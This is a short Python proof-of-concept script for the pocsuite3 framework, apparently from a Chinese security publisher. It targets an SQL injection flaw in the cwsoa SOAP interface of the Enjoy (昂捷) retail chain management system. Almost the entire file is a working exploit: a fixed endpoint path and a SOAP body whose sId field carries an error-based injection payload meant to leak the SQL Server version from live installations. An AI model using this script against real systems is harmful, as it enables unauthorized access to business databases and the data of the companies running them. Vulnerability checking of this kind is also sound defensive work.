# _*_ coding:utf-8 _*_
# @Time : 2023/11/27 13:27
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class enjoyIT1(POCBase):
    pocDesc = ''' 昂捷商业连锁管理信息系统cwsoa接口SQL注入漏洞 '''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-27'
    createDate = '2023-11-27'
    updateDate = '2023-11-27'
    name = '昂捷商业连锁管理信息系统cwsoa接口SQL注入漏洞'
    appName = '昂捷商业连锁管理信息系统'



    def _verify(self):

        result = {}
        path = "/EnjoyRMIS_WS/WS/POS/cwsoa.asmx"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Content-Type": "text/xml;charset=UTF-8",
            "SOAPAction": "http://tempuri.org/GetOAById"
        }

        url = self.url + path
        payload = 'AND 7557 IN (SELECT @@version) -- +'
        xml_data = '''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetOAById>
         <!--type: string-->
         <tem:sId> gero et' AND 7557 IN (SELECT @@version) -- +</tem:sId>
      </tem:GetOAById>
   </soap:Body>
</soap:Envelope>'''

        try:
            response = requests.post(url, headers=headers,data=xml_data,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 500 and 'Microsoft SQL Server' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(enjoyIT1)
